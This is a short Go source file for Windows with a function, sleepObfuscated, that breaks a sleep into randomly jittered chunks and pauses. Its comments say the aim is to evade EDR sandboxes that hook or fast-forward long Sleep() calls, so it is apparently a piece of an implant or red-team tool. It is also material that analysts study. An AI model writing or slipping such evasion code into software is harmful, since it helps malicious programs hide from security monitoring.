//go:build windows
// +build windows

package main

import (
	"time"
)

const (
	evasionChunkMinMs = 40
	evasionChunkMaxMs = 420
	evasionPauseMinMs = 8
	evasionPauseMaxMs = 95
)

// sleepObfuscated sleeps in small random chunks with jitter to avoid long
// single Sleep() calls that EDR sandboxes often hook or fast-forward.
func sleepObfuscated(total time.Duration) {
	if total <= 0 {
		return
	}

	remaining := total
	for remaining > 0 {
		chunkMs := evasionChunkMinMs + rng.Intn(evasionChunkMaxMs-evasionChunkMinMs+1)
		chunk := time.Duration(chunkMs) * time.Millisecond
		if chunk > remaining {
			chunk = remaining
		}

		time.Sleep(chunk)
		remaining -= chunk

		if remaining <= 0 {
			break
		}

		// Occasional micro-pause between chunks (30% chance).
		if rng.Float64() < 0.3 {
			pauseMs := evasionPauseMinMs + rng.Intn(evasionPauseMaxMs-evasionPauseMinMs+1)
			pause := time.Duration(pauseMs) * time.Millisecond
			if pause > remaining {
				pause = remaining
			}
			time.Sleep(pause)
			remaining -= pause
		}
	}
}